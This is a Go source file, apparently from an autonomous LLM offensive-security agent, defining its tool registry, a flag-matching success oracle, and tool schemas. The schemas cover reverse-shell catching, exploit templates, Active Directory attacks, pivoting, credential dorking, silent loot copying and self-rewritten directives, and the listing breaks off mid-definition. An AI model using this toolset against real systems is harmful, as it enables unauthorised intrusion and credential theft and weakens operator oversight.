package agent

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/0xP4X/drogonclaw-go/internal/adapt"
	"github.com/0xP4X/drogonclaw-go/internal/cloud"
	"github.com/0xP4X/drogonclaw-go/internal/config"
	"github.com/0xP4X/drogonclaw-go/internal/core"
	"github.com/0xP4X/drogonclaw-go/internal/ghost"
	"github.com/0xP4X/drogonclaw-go/internal/intel"
	"github.com/0xP4X/drogonclaw-go/internal/memory"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/evasion"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/exfiltration"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/exploitation"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/lateral"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/pivot"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/postexploit"
	"github.com/0xP4X/drogonclaw-go/internal/redteam/social"
	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
	"github.com/0xP4X/drogonclaw-go/internal/shell"
	"github.com/0xP4X/drogonclaw-go/internal/skills"
	"github.com/0xP4X/drogonclaw-go/internal/toolmgr"
	"github.com/openai/openai-go"
)

type BuiltinFn func(ctx context.Context, args map[string]any) string

// ToolResult is a structured result from tool execution.
// It replaces the previous free-form string return with typed fields
// that the orchestrator can use for deterministic verification.
type ToolResult struct {
	ToolName     string
	ExitCode     int
	Stdout       string
	Stderr       string
	Duration     time.Duration
	Artifacts    []string
	ParsedFacts  map[string]interface{}
	FailureClass string // "none", "tool_missing", "bad_input", "timeout", "no_signal", "contradiction"
	Success      bool
}

// SuccessOracle verifies that a claimed success is backed by evidence.
// The LLM must not be able to declare success by prose alone.
type SuccessOracle struct {
	flagPattern *regexp.Regexp
}

func NewSuccessOracle(flagPattern string) *SuccessOracle {
	if flagPattern == "" {
		flagPattern = `(?i)(?:flag|ctf|picoctf|htb)\{[^\r\n{}]{1,200}\}`
	}
	return &SuccessOracle{
		flagPattern: regexp.MustCompile(flagPattern),
	}
}

// Verify checks whether the tool result contains verified evidence of success.
// It returns true only if the result contains a flag matching the expected pattern
// or if the result explicitly contains a verified success indicator.
func (o *SuccessOracle) Verify(result ToolResult) (bool, string) {
	if result.FailureClass != "none" && result.FailureClass != "" {
		return false, fmt.Sprintf("tool execution failed with class: %s", result.FailureClass)
	}
	if !result.Success {
		return false, "tool did not report success"
	}
	matches := o.flagPattern.FindAllString(result.Stdout, -1)
	if len(matches) > 0 {
		return true, fmt.Sprintf("verified flag found: %d match(es)", len(matches))
	}
	return false, "no verified flag or success indicator found in tool output"
}

// ToolRegistry holds all available tools and dispatches execution.
type ToolRegistry struct {
	manifest  *skills.Manifest
	sandbox   *sandbox.Docker
	validator *EvidenceValidator
	lootDb    *memory.LootDB
	shells    *shell.Manager
	cfg       *config.Manager
	graph     *memory.Graph
	provider  *Provider
	oracle    *SuccessOracle

	// Built-in tools not in the manifest
	builtins map[string]BuiltinFn

	// Cached tool definitions (computed once, reused on every LLM call)
	cachedDefs []openai.ChatCompletionToolParam

	// Recent successful observations used by the evidence gate.
	recentEvidence []toolEvidence

	// lastResult/lastTarget capture the most recent execution outcome so the
	// success oracle can verify real evidence instead of model prose.
	lastResult ToolResult
	lastTarget string

	// recentCommands deduplicates repeated shell_execute calls within a
	// short time window so the agent cannot burn iterations re-running
	// commands that already returned the same data.
	recentCommands map[string]recentCmd

	// SkillLearner learns from successful attacks (inspired by Hermes Agent).
	// After a verified success, the technique is saved as a reusable skill.
	skillLearner *SkillLearner

	// Subagents enables autonomous subagent delegation and parallel workstreams
	subagents *SubagentManager
}

const shellDedupWindow = 60 * time.Second
const maxRecentCommands = 200

type recentCmd struct {
	result   string
	executed time.Time
}

type toolEvidence struct {
	Tool      string
	Summary   string
	Timestamp time.Time
}

func NewToolRegistry(manifest *skills.Manifest, sb *sandbox.Docker, val *EvidenceValidator, loot *memory.LootDB, cfg *config.Manager, graph *memory.Graph, provider *Provider) *ToolRegistry {
	r := &ToolRegistry{
		manifest:       manifest,
		sandbox:        sb,
		validator:      val,
		lootDb:         loot,
		shells:         shell.GlobalShells,
		cfg:            cfg,
		graph:          graph,
		provider:       provider,
		oracle:         NewSuccessOracle(""),
		builtins:       make(map[string]BuiltinFn),
		recentCommands: make(map[string]recentCmd),
		skillLearner:   NewSkillLearner("data"),
	}
	r.registerBuiltins()
	return r
}

// SetSubagents connects the SubagentManager for subagent delegation tools.
func (r *ToolRegistry) SetSubagents(sm *SubagentManager) {
	r.subagents = sm
}

// VerifySuccess checks whether a tool result contains verified evidence of success.
func (r *ToolRegistry) VerifySuccess(name string, result string) (bool, string) {
	if r.oracle == nil {
		return false, "no success oracle configured"
	}
	tr := ToolResult{
		ToolName: name,
		Stdout:   result,
		Success:  true,
	}
	return r.oracle.Verify(tr)
}

// ---------------------------------------------------------------------------
// Outcome classification & evidence evaluation (audit Phase 1)
// ---------------------------------------------------------------------------

var (
	reStatusExit = regexp.MustCompile(`command exited with status (\d+)`)
	reFlag       = regexp.MustCompile(`(?i)(?:flag|ctf|picoctf|htb)\{[^\r\n{}]{1,200}\}`)
	reCVE        = regexp.MustCompile(`CVE-\d{4}-\d+`)
)

// extractFindings returns conservative, high-signal evidence that a tool
// actually discovered something (a flag, CVE, open port, HTTP 200, or a
// confirmed vulnerability). It deliberately ignores prose claims so the oracle
// cannot be satisfied by the model narrating success.
func extractFindings(name, out string) []string {
	var f []string
	if m := reFlag.FindString(out); m != "" {
		f = append(f, "flag:"+m)
	}
	if m := reCVE.FindString(out); m != "" {
		f = append(f, "cve:"+m)
	}
	low := strings.ToLower(out)
	switch {
	case strings.Contains(low, "is vulnerable"), regexp.MustCompile(`parameter .* is vulnerable`).MatchString(out):
		f = append(f, "vuln:confirmed")
	case strings.Contains(low, "status: 200"):
		f = append(f, "http:200")
	case regexp.MustCompile(`\d+/(open|filtered)`).MatchString(out):
		f = append(f, "port:open")
	case strings.Contains(low, "exploit success"), strings.Contains(low, "successfully exploited"),
		strings.Contains(low, "authentication bypass"), strings.Contains(low, "remote code execution"):
		f = append(f, "exploit:confirmed")
	case regexp.MustCompile(`found [1-9]\d* subdomain`).MatchString(low):
		f = append(f, "recon:subdomain")
	case strings.Contains(low, "certificate transparency") && regexp.MustCompile(`count:\s*[1-9]`).MatchString(low):
		f = append(f, "recon:cert")
	case strings.Contains(low, "a:") && strings.Contains(low, "mx:") && strings.Contains(low, "ns:"):
		f = append(f, "recon:dns")
	}
	return f
}

func extractTarget(args map[string]any) string {
	for _, k := range []string{"target", "url", "domain", "host", "hostname", "target_ip", "subnet", "dc_ip"} {
		if v, ok := args[k]; ok {
			if s, ok := v.(string); ok && strings.TrimSpace(s) != "" {
				return s
			}
		}
	}
	return ""
}

func truncateFindings(in []string) []string {
	out := in
	if len(out) > 3 {
		out = out[:3]
	}
	for i, s := range out {
		if len(s) > 80 {
			out[i] = s[:77] + "..."
		}
	}
	return out
}

// classifyOutcome converts a tool's display string + sandbox error into a typed
// ToolResult with a real failure class and detected findings.
func (r *ToolRegistry) classifyOutcome(name, out string, runErr error) ToolResult {
	tr := ToolResult{ToolName: name, Stdout: out, Success: true, FailureClass: "none"}
	if runErr != nil {
		tr.Success = false
		msg := runErr.Error()
		switch {
		case reStatusExit.MatchString(msg):
			if m := reStatusExit.FindStringSubmatch(msg); len(m) == 2 {
				if code, e := strconv.Atoi(m[1]); e == nil {
					tr.ExitCode = code
				}
			}
			if tr.ExitCode == 0 {
				tr.FailureClass = "none"
				tr.Success = true
			} else {
				tr.FailureClass = "no_signal"
			}
		case strings.Contains(msg, "not found"), strings.Contains(msg, "no such file"), strings.Contains(msg, "executable"):
			tr.FailureClass = "tool_missing"
		case strings.Contains(msg, "timeout"), strings.Contains(msg, "context deadline"):
			tr.FailureClass = "timeout"
		case strings.Contains(msg, "invalid"), strings.Contains(msg, "denied"):
			tr.FailureClass = "bad_input"
		default:
			tr.FailureClass = "no_signal"
		}
	}
	if tr.FailureClass == "none" {
		low := strings.ToLower(out)
		switch {
		case strings.Contains(low, "[sandbox error]"), strings.Contains(low, "[native error]"), strings.Contains(low, "[tool error]"):
			tr.FailureClass = "no_signal"
			tr.Success = false
		case strings.Contains(low, "command not found"):
			tr.FailureClass = "tool_missing"
			tr.Success = false
		}
	}
	if findings := extractFindings(name, out); len(findings) > 0 {
		tr.ParsedFacts = map[string]interface{}{"findings": findings}
	}
	return tr
}

// EvaluateTool returns a deterministic verdict about whether the last tool
// execution produced verified evidence. The model is told the status so it
// cannot claim success on prose alone.
func (r *ToolRegistry) EvaluateTool(name, result string) (verified bool, status, reason string) {
	tr := r.lastResult
	if tr.ToolName == "" {
		tr = r.classifyOutcome(name, result, nil)
	}
	if tr.FailureClass != "none" && tr.FailureClass != "" {
		return false, "failed", fmt.Sprintf("execution failed (%s)", tr.FailureClass)
	}
	if findings, ok := tr.ParsedFacts["findings"].([]string); ok && len(findings) > 0 {
		return true, "verified", fmt.Sprintf("evidence: %s", strings.Join(truncateFindings(findings), "; "))
	}
	if reFlag.MatchString(tr.Stdout) {
		return true, "verified", "flag present in output"
	}
	if tr.Success {
		return false, "clean", "execution succeeded but no finding detected"
	}
	return false, "failed", "no verified evidence"
}

// RecordVerifiedFinding persists a verified finding to the loot database with
// provenance (tool + target). It is a no-op unless evaluation verified a
// finding, keeping the evidence ledger free of unverified claims.
func (r *ToolRegistry) RecordVerifiedFinding() {
	tr := r.lastResult
	if tr.ToolName == "" {
		return
	}
	if findings, ok := tr.ParsedFacts["findings"].([]string); !ok || len(findings) == 0 {
		if !reFlag.MatchString(tr.Stdout) {
			return
		}
	}
	if r.lootDb == nil {
		return
	}
	desc := "verified finding via " + tr.ToolName
	if findings, ok := tr.ParsedFacts["findings"].([]string); ok && len(findings) > 0 {
		desc = findings[0]
	}
	cve := reCVE.FindString(tr.Stdout)
	severity := "medium"
	low := strings.ToLower(tr.Stdout)
	switch {
	case strings.Contains(low, "critical"):
		severity = "critical"
	case strings.Contains(low, "high"):
		severity = "high"
	}
	_ = r.lootDb.InsertVulnerability(r.lastTarget, cve, desc, severity)

	// Teach the skill learner from this verified success
	if r.skillLearner != nil {
		r.skillLearner.ObserveExecution(tr.ToolName, nil, tr.Stdout, true)
	}
}

// GetSkillLearner returns the skill learner for external access.
func (r *ToolRegistry) GetSkillLearner() *SkillLearner {
	return r.skillLearner
}

// GetLearnedContext returns learned attack patterns relevant to a target,
// formatted for injection into the LLM context.
func (r *ToolRegistry) GetLearnedContext(target string) string {
	if r.skillLearner == nil {
		return ""
	}
	return r.skillLearner.FormatForLLM(target)
}

// Definitions returns the OpenAI-format tool definitions for the LLM.
func (r *ToolRegistry) Definitions() []openai.ChatCompletionToolParam {
	// Return cached definitions if available
	if r.cachedDefs != nil {
		return r.cachedDefs
	}

	var defs []openai.ChatCompletionToolParam

	// Phase 2: Structured tool wrapper definitions
	defs = append(defs, toolWrapperDefinitions()...)

	// Skills from manifest
	for _, skill := range r.manifest.Skills {
		props := map[string]interface{}{}
		required := []string{}

		for name, param := range skill.Parameters {
			props[name] = map[string]string{
				"type":        param.Type,
				"description": param.Description,
			}
			if param.Required {
				required = append(required, name)
			}
		}

		schema := map[string]interface{}{
			"type":       "object",
			"properties": props,
		}
		if len(required) > 0 {
			schema["required"] = required
		}

		defs = append(defs, openai.ChatCompletionToolParam{
			Type: "function",
			Function: openai.FunctionDefinitionParam{
				Name:        skill.Name,
				Description: openai.String(skill.Description),
				Parameters:  openai.FunctionParameters(schema),
			},
		})
	}

	// Built-in tools
	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "shell_execute",
			Description: openai.String("Execute any shell command inside the Kali Docker sandbox. Stateful — CWD persists between calls."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"command": map[string]interface{}{"type": "string", "description": "The shell command to execute"},
					"timeout": map[string]interface{}{"type": "integer", "description": "Timeout in seconds (default: 60)"},
				},
				"required": []string{"command"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "update_neural_memory",
			Description: openai.String("Store a discovered asset, credential, flag, or intelligence finding into the memory graph."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"id":           map[string]interface{}{"type": "string", "description": "Unique identifier for this finding"},
					"label":        map[string]interface{}{"type": "string", "description": "One of: Operator, Target, Asset, Port, Service, Vulnerability, Credential, Flag"},
					"data":         map[string]interface{}{"type": "string", "description": "JSON string of properties to store"},
					"source_id":    map[string]interface{}{"type": "string", "description": "Optional source node id for a graph relationship"},
					"target_id":    map[string]interface{}{"type": "string", "description": "Optional target node id for a graph relationship"},
					"relationship": map[string]interface{}{"type": "string", "description": "Optional relationship name, for example HAS_PORT, RUNS_SERVICE, HAS_VULNERABILITY, OWNS_CREDENTIAL"},
				},
				"required": []string{"id", "label", "data"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "catch_shell",
			Description: openai.String("Start a TCP listener to catch an incoming reverse shell. Blocks until a connection is received (max 2 minutes). Returns the session ID."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"port": map[string]interface{}{"type": "integer", "description": "TCP port to listen on (e.g. 4444)"},
				},
				"required": []string{"port"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "shell_session_exec",
			Description: openai.String("Execute a command inside an active reverse shell session. Use the session_id returned by catch_shell."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"session_id": map[string]interface{}{"type": "string", "description": "The session ID from catch_shell"},
					"command":    map[string]interface{}{"type": "string", "description": "The command to run in the reverse shell"},
				},
				"required": []string{"session_id", "command"},
			},
		},
	})

	defs = append(defs, openai.ChatCompletionToolParam{
		Type: "function",
		Function: openai.FunctionDefinitionParam{
			Name:        "download_loot",
			Description: openai.String("Silently copy a file from the selected runtime to the local loot directory. Never prints file contents. Returns the saved path and file size."),
			Parameters: openai.FunctionParameters{
				"type": "object",
				"properties": map[string]interface{}{
					"remote_path": map[string]interface{}{"type": "string", "description": "Full path to the file inside the selected runtime (e.g. /workspace/result.txt)"},
				},
				"required": []string{"remote_path"},
			},
		},
	})

	// ── INTELLIGENCE TOOLS ─────────────────────────────────────────────────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "profile_target", Description: openai.String("Build an evidence-led passive profile for a domain, IP, or URL using DNS, RDAP, certificate transparency, and configured passive APIs. Does not run search-engine dorks or crawl pages."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target": map[string]interface{}{"type": "string", "description": "Domain, IP, or URL to profile"},
		}, "required": []string{"target"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "web_search", Description: openai.String("Search the web for CVEs, exploit PoCs, default credentials, or target research."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"query":       map[string]interface{}{"type": "string", "description": "Search query"},
			"num_results": map[string]interface{}{"type": "integer", "description": "Number of results (default 5)"},
		}, "required": []string{"query"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "fetch_url", Description: openai.String("Fetch and read the full text of a URL — exploit writeups, CVE pages, GitHub READMEs."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"url": map[string]interface{}{"type": "string", "description": "URL to fetch"},
		}, "required": []string{"url"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "deep_research", Description: openai.String("Multi-step research: searches, fetches top pages, returns synthesized intelligence on any topic."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"topic": map[string]interface{}{"type": "string", "description": "Research topic"},
			"depth": map[string]interface{}{"type": "integer", "description": "Pages to read (default 5)"},
		}, "required": []string{"topic"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_shodan", Description: openai.String("Query Shodan for open ports, banners, OS, and known CVEs for an IP or hostname."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target": map[string]interface{}{"type": "string", "description": "IP or hostname"},
		}, "required": []string{"target"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_virustotal", Description: openai.String("Check VirusTotal reputation, malware history, and passive DNS for a URL, domain, or IP."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target": map[string]interface{}{"type": "string", "description": "URL, domain, or IP"},
		}, "required": []string{"target"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_whois", Description: openai.String("WHOIS/RDAP lookup for a domain or IP — registrar, dates, nameservers."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target": map[string]interface{}{"type": "string", "description": "Domain or IP"},
		}, "required": []string{"target"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_certs", Description: openai.String("Enumerate subdomains via certificate transparency logs (crt.sh). No API key needed."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"domain": map[string]interface{}{"type": "string", "description": "Root domain"},
		}, "required": []string{"domain"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_emails", Description: openai.String("Retrieve published business contacts for a target domain through the configured Hunter.io provider. It does not fall back to search-engine dorks."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"domain": map[string]interface{}{"type": "string", "description": "Target domain (e.g. example.com)"},
		}, "required": []string{"domain"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_github_dork", Description: openai.String("Search GitHub for leaked credentials, API keys, .env files, connection strings, and private keys related to a target org or domain. Uses GITHUB_TOKEN when set for authenticated code/repo search; falls back to passive dorking otherwise."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target": map[string]interface{}{"type": "string", "description": "Target org name, domain, or keyword (e.g. 'acme-corp' or 'acme.com')"},
		}, "required": []string{"target"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "osint_dns", Description: openai.String("Comprehensive DNS enumeration (A, AAAA, MX, NS, TXT, SOA, CNAME) for a domain using Google DNS-over-HTTPS. No API key required."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"domain": map[string]interface{}{"type": "string", "description": "Target domain to enumerate"},
		}, "required": []string{"domain"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "lookup_cve", Description: openai.String("Search local CVE database for vulnerabilities matching a product and version. Returns CVE IDs, CVSS scores, descriptions."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"query": map[string]interface{}{"type": "string", "description": "Product name/version (e.g. 'Apache 2.4.49')"},
		}, "required": []string{"query"}},
	}})

	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "refresh_cve_feeds", Description: openai.String("Poll CISA KEV and security-advisory RSS/Atom feeds, ingest newly published/exploited CVEs into the local CVE database, and report what was added. Call before lookup_cve on a fresh engagement."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{}},
	}})

	// ── SELF-REPROGRAMMING ──────────────────────────────────────────────────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "create_skill", Description: openai.String("Create a new reusable skill stored permanently. Use {{param}} in command_template for dynamic values."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"name":             map[string]interface{}{"type": "string", "description": "Skill name (snake_case)"},
			"description":      map[string]interface{}{"type": "string", "description": "What it does"},
			"command_template": map[string]interface{}{"type": "string", "description": "Shell command with {{param}} placeholders"},
		}, "required": []string{"name", "description", "command_template"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "update_directive", Description: openai.String("Modify your own operational directives at runtime to adapt strategy mid-mission."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"key":   map[string]interface{}{"type": "string", "description": "Directive key (e.g. 'focus', 'priority')"},
			"value": map[string]interface{}{"type": "string", "description": "New directive value"},
		}, "required": []string{"key", "value"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "write_and_run_script", Description: openai.String("Write a custom Python/Bash/Ruby script and run it in the selected runtime. Network/privesc scripts require operator approval."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"filename": map[string]interface{}{"type": "string", "description": "Script filename (e.g. 'exploit.py')"},
			"language": map[string]interface{}{"type": "string", "description": "Language: python, bash, ruby, perl"},
			"code":     map[string]interface{}{"type": "string", "description": "Complete source code"},
		}, "required": []string{"filename", "language", "code"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name:        "save_document",
		Description: openai.String("Save a user-requested document to the local filesystem, defaulting to the operator's Desktop. Supports Markdown (.md) and PDF (.pdf). Use this when the user asks for a document, report, notes, checklist, or write-up saved as a file."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"title":     map[string]interface{}{"type": "string", "description": "Document title and filename basis"},
			"format":    map[string]interface{}{"type": "string", "description": "md or pdf"},
			"content":   map[string]interface{}{"type": "string", "description": "Complete document body"},
			"directory": map[string]interface{}{"type": "string", "description": "Output directory. Defaults to Desktop. Use Desktop unless the user asks for a different path."},
		}, "required": []string{"title", "format", "content"}},
	}})

	// ── TOOL MANAGER ───────────────────────────────────────────────────────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "install_tool", Description: openai.String("Auto-install a missing tool via apt/go/pip. Requires operator approval. Use when 'which <tool>' is empty."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"tool_name": map[string]interface{}{"type": "string", "description": "Tool to install"},
			"reason":    map[string]interface{}{"type": "string", "description": "Why you need it"},
		}, "required": []string{"tool_name", "reason"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "github_download", Description: openai.String("Download a tool or exploit PoC from GitHub into the sandbox. Requires operator approval."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"repo":         map[string]interface{}{"type": "string", "description": "owner/repo"},
			"file_pattern": map[string]interface{}{"type": "string", "description": "Asset filename pattern"},
			"reason":       map[string]interface{}{"type": "string", "description": "Why you need it"},
		}, "required": []string{"repo", "reason"}},
	}})

	// ── EXPLOITATION TOOLS ─────────────────────────────────────────────────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "run_exploit", Description: openai.String("Run a verified exploit template (e.g. eternalblue, log4shell) against a target. The output will be parsed into an ExploitState with next steps."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"template": map[string]interface{}{"type": "string", "description": "Template name (e.g. 'eternalblue', 'log4shell'). Call this tool with an invalid name to see all available."},
			"params": map[string]interface{}{
				"type": "object", "additionalProperties": map[string]interface{}{"type": "string"},
				"description": "Parameters for the exploit (e.g. target, lhost, lport, target_url, callback_url)",
			},
		}, "required": []string{"template", "params"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "run_ad_template", Description: openai.String("Run an Active Directory exploit template (e.g. ad_kerberoast, ad_dcsync)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"template": map[string]interface{}{"type": "string", "description": "Template name (e.g. 'ad_kerberoast'). Call with an invalid name to see all available."},
			"params": map[string]interface{}{
				"type": "object", "additionalProperties": map[string]interface{}{"type": "string"},
				"description": "Parameters (e.g. dc_ip, domain, user, password, target, ntlm_hash)",
			},
		}, "required": []string{"template", "params"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "auth_bypass_scan", Description: openai.String("Run an automated suite of authentication bypass and logic flaw checks against a web login/target URL (SQLi, IDOR, Parameter Pollution, Default Creds)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"target_url": map[string]interface{}{"type": "string", "description": "Target base URL (e.g. 'http://10.10.10.10')"},
		}, "required": []string{"target_url"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "binary_recon", Description: openai.String("Run automated triage on a binary file (checksec, strings, file, nm, ldd)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary in sandbox"},
		}, "required": []string{"binary_path"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "binary_ret2libc", Description: openai.String("Run an adaptive ret2libc chain: auto-discovers the architecture and a GOT leak primitive, leaks a libc address, resolves the libc base, and executes a full system(\"/bin/sh\") ROP payload."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary"},
			"libc_path":   map[string]interface{}{"type": "string", "description": "Path to libc"},
			"offset":      map[string]interface{}{"type": "string", "description": "Offset to RIP (e.g. '40', '0x28')"},
		}, "required": []string{"binary_path", "libc_path", "offset"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "binary_gdb_run", Description: openai.String("Run a binary under GDB and capture the crash state (registers, backtrace)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"binary_path": map[string]interface{}{"type": "string", "description": "Path to binary"},
			"input_file":  map[string]interface{}{"type": "string", "description": "Optional file to redirect to stdin (e.g. 'payload.txt')"},
		}, "required": []string{"binary_path"}},
	}})

	// ── CONSCIOUSNESS & UNKNOWN FLAW HUNTING ───────────────────────────────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "ask_operator", Description: openai.String("Pause autonomous execution and ask your human operator for clarification, intuition, or guidance when you are stuck."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"question": map[string]interface{}{"type": "string", "description": "The explicit question for the operator"},
			"context":  map[string]interface{}{"type": "string", "description": "Brief context on why you are stuck"},
		}, "required": []string{"question", "context"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "fuzz_endpoint", Description: openai.String("Fuzz a web endpoint with ffuf to find hidden parameters, directories, or logic flaws. Use 'FUZZ' keyword in the URL or payload."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"command": map[string]interface{}{"type": "string", "description": "Full ffuf command (e.g. 'ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt')"},
			"reason":  map[string]interface{}{"type": "string", "description": "Hypothesis you are testing"},
		}, "required": []string{"command", "reason"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "analyze_source_code", Description: openai.String("Read and analyze raw source code files to hunt for 0-days, hardcoded secrets, or logic flaws (SQLi, IDOR, deserialization)."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"file_path": map[string]interface{}{"type": "string", "description": "Path to the source file (e.g. '/var/www/html/login.php')"},
		}, "required": []string{"file_path"}},
	}})

	// ── GOD TIER EXTENSIONS (PIVOT, EVASION, CLOUD, PRIVESC, SOCIAL) ──────
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "deploy_pivot", Description: openai.String("Deploy Ligolo-ng/Chisel pivot agent to a compromised host via an active session."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"session_id": map[string]interface{}{"type": "string", "description": "Active shell session ID"},
			"local_port": map[string]interface{}{"type": "integer", "description": "Port to catch the pivot connection"},
		}, "required": []string{"session_id", "local_port"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
		Name: "route_traffic", Description: openai.String("Update local proxychains or routing tables to point to the newly deployed pivot."),
		Parameters: openai.FunctionParameters{"type": "object", "properties": map[string]interface{}{
			"subnet":     map[string]interface{}{"type": "string", "description": "Target internal subnet (e.g. 10.0.0.0/24)"},
			"proxy_port": map[string]interface{}{"type": "integer", "description": "Local port the pivot is listening on"},
		}, "required": []string{"subnet", "proxy_port"}},
	}})
	defs = append(defs, openai.ChatCompletionToolParam{Type: "function", Function: openai.FunctionDefinitionParam{
